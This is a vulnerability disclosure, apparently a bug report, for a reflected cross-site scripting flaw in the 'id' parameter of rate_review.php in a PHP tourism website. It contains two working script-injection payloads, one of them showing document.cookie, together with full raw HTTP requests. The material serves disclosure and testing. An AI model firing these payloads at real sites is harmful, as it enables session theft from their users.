# Simple Responsive Tourism Website v1.0 by oretnom23 has Cross-site scripting (reflected)

Website source address:https://www.sourcecodester.com/php/14838/simple-responsive-tourism-website-using-php-free-source-code.html

BUG_Author: LiuYi

Vulnerability File: /tourism/rate_review.php

Parameter "id" (GET), exists XSS vulnerability

Payload1:id=1"><script>alert(1111)</script>

```
GET /tourism/rate_review.php?id=1%22%3E%3Cscript%3Ealert(1111)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close
```

![image](https://github.com/verylazycat/picture/blob/main/verylazycat1111.png)

Payload2:id=1"><script>alert(document.cookie)</script>

```
GET /tourism/rate_review.php?id=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close
```

![image](https://github.com/verylazycat/picture/blob/main/verylazycatcookie.png)
